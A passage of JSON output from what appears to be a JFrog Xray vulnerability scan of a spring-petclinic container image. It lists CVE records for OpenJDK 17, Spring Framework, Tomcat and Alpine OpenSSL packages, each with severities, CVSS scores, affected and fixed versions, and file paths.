            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21277",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-195278",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0 ≤ Version < 17.0.2",
               "7.0 ≤ Version < 7.331",
               "8.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21282",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21282",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-195277",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21283",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21283",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190665",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Utility). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.13.10",
               "17.0.0 ≤ Version < 17.0.1.12",
               "7.0.0 ≤ Version < 7.321.08",
               "8.0.0 ≤ Version < 8.311.11"
            ],
            "fixed_versions": [
               "11.0.13.10",
               "17.0.1.12",
               "7.321.08",
               "8.311.11"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-35561",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Utility). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-35561",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-188493",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.13.10",
               "17.0.0 ≤ Version < 17.0.1.12",
               "7.0.0 ≤ Version < 7.321.08",
               "8.0.0 ≤ Version < 8.311.11"
            ],
            "fixed_versions": [
               "11.0.13.10",
               "17.0.1.12",
               "7.321.08",
               "8.311.11"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-35586",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-35586",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-703229",
         "severity": "Low",
         "severity_source": "GitHub Security Advisory",
         "pkg_type": "maven",
         "summary": "CVE-2024-38820 ensured Locale-independent, lowercase conversion for both the configured disallowedFields patterns and for request parameter names. However, there are still cases where it is possible to bypass the disallowedFields checks.\n\nAffected Spring Products and Versions\n\nSpring Framework:\n  *  6.2.0 - 6.2.6\n\n  *  6.1.0 - 6.1.19\n\n  *  6.0.0 - 6.0.27\n\n  *  5.3.0 - 5.3.42\n  *  Older, unsupported versions are also affected\n\n\n\nMitigation\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\nAffected version(s)Fix Version Availability 6.2.x\n 6.2.7\nOSS6.1.x\n 6.1.20\nOSS6.0.x\n 6.0.28\n Commercial https://enterprise.spring.io/ 5.3.x\n 5.3.43\n Commercial https://enterprise.spring.io/ \nNo further mitigation steps are necessary.\n\n\nGenerally, we recommend using a dedicated model object with properties only for data binding, or using constructor binding since constructor arguments explicitly declare what to bind together with turning off setter binding through the declarativeBinding flag. See the Model Design section in the reference documentation.\n\nFor setting binding, prefer the use of allowedFields (an explicit list) over disallowedFields.\n\nCredit\n\nThis issue was responsibly reported by the TERASOLUNA Framework Development Team from NTT DATA Group Corporation.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.springframework:spring-context",
         "source_id": "gav://org.springframework:spring-context",
         "source_comp_id": "gav://org.springframework:spring-context:6.2.2",
         "component_versions": {
            "id": "org.springframework:spring-context",
            "vulnerable_versions": [
               "≤ 5.3.39",
               "6.0.0 ≤ Version ≤ 6.0.23",
               "6.1.0 ≤ Version ≤ 6.1.19",
               "6.2.0 ≤ Version ≤ 6.2.6"
            ],
            "fixed_versions": [
               "6.1.20",
               "6.2.7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-22233",
                     "cwe": [
                        "CWE-20"
                     ],
                     "cwe_details": {
                        "CWE-20": {
                           "name": "Improper Input Validation",
                           "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "6"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "3.1/CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "CVE-2024-38820 ensured Locale-independent, lowercase conversion for both the configured disallowedFields patterns and for request parameter names. However, there are still cases where it is possible to bypass the disallowedFields checks.\n\nAffected Spring Products and Versions\n\nSpring Framework:\n  *  6.2.0 - 6.2.6\n\n  *  6.1.0 - 6.1.19\n\n  *  6.0.0 - 6.0.27\n\n  *  5.3.0 - 5.3.42\n  *  Older, unsupported versions are also affected\n\n\n\nMitigation\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\n| Affected version(s) | Fix Version | Availability |\n| - | - | - |\n| 6.2.x |  6.2.7 | OSS |\n| 6.1.x |  6.1.20 | OSS |\n| 6.0.x |  6.0.28 |  Commercial https://enterprise.spring.io/ |\n| 5.3.x |  5.3.43 | Commercial https://enterprise.spring.io/  |\n\nNo further mitigation steps are necessary.\n\n\nGenerally, we recommend using a dedicated model object with properties only for data binding, or using constructor binding since constructor arguments explicitly declare what to bind together with turning off setter binding through the declarativeBinding flag. See the Model Design section in the reference documentation.\n\nFor setting binding, prefer the use of allowedFields (an explicit list) over disallowedFields.\n\nCredit\n\nThis issue was responsibly reported by the TERASOLUNA Framework Development Team from NTT DATA Group Corporation.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/spring-context-6.2.2.jar",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.springframework:spring-context:6.2.2/org.springframework:spring-context:6.2.2"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-22233",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-703041",
         "severity": "Low",
         "severity_source": "GitHub Security Advisory",
         "pkg_type": "maven",
         "summary": "Improper Handling of Case Sensitivity vulnerability in Apache Tomcat's GCI servlet allows security constraint bypass of security constraints that apply to the pathInfo component of a URI mapped to the CGI servlet.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.6, from 10.1.0-M1 through 10.1.40, from 9.0.0.M1 through 9.0.104.\n\nUsers are recommended to upgrade to version 11.0.7, 10.1.41 or 9.0.105, which fixes the issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.apache.tomcat.embed:tomcat-embed-core",
         "source_id": "gav://org.apache.tomcat.embed:tomcat-embed-core",
         "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
         "component_versions": {
            "id": "org.apache.tomcat.embed:tomcat-embed-core",
            "vulnerable_versions": [
               "10.1.0-M1 ≤ Version < 10.1.41",
               "11.0.0-M1 ≤ Version < 11.0.7",
               "9.0.0.M1 ≤ Version < 9.0.105"
            ],
            "fixed_versions": [
               "10.1.41",
               "11.0.7",
               "9.0.105"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-46701",
                     "cwe": [
                        "CWE-178"
                     ],
                     "cwe_details": {
                        "CWE-178": {
                           "name": "Improper Handling of Case Sensitivity",
                           "description": "The product does not properly account for differences in case sensitivity when accessing or determining the properties of a resource, leading to inconsistent results."
                        }
                     }
                  }
               ],
               "description": "Improper Handling of Case Sensitivity vulnerability in Apache Tomcat's GCI servlet allows security constraint bypass of security constraints that apply to the pathInfo component of a URI mapped to the CGI servlet.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.6, from 10.1.0-M1 through 10.1.40, from 9.0.0.M1 through 9.0.104.\n\nUsers are recommended to upgrade to version 11.0.7, 10.1.41 or 9.0.105, which fixes the issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/tomcat-embed-core-10.1.34.jar",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.apache.tomcat.embed:tomcat-embed-core:10.1.34/org.apache.tomcat.embed:tomcat-embed-core:10.1.34"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-46701",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-646795",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.2-r3"
            ],
            "fixed_versions": [
               "3.3.2-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9143"
                  }
               ],
               "description": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9143",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-646795",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.2-r3"
            ],
            "fixed_versions": [
               "3.3.2-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9143"
                  }
               ],
               "description": "Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted\nexplicit values for the field polynomial can lead to out-of-bounds memory reads\nor writes.\n\nImpact summary: Out of bound memory writes can lead to an application crash or\neven a possibility of a remote code execution, however, in all the protocols\ninvolving Elliptic Curve Cryptography that we're aware of, either only \"named\ncurves\" are supported, or, if explicit curve parameters are supported, they\nspecify an X9.62 encoding of binary (GF(2^m)) curves that can't represent\nproblematic input values. Thus the likelihood of existence of a vulnerable\napplication is low.\n\nIn particular, the X9.62 encoding is used for ECC keys in X.509 certificates,\nso problematic inputs cannot occur in the context of processing X.509\ncertificates.  Any problematic use-cases would have to be using an \"exotic\"\ncurve encoding.\n\nThe affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(),\nand various supporting BN_GF2m_*() functions.\n\nApplications working with \"exotic\" explicit binary (GF(2^m)) curve parameters,\nthat make it possible to represent invalid field polynomials with a zero\nconstant term, via the above or similar APIs, may terminate abruptly as a\nresult of reading or writing outside of array bounds.  Remote code execution\ncannot easily be ruled out.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
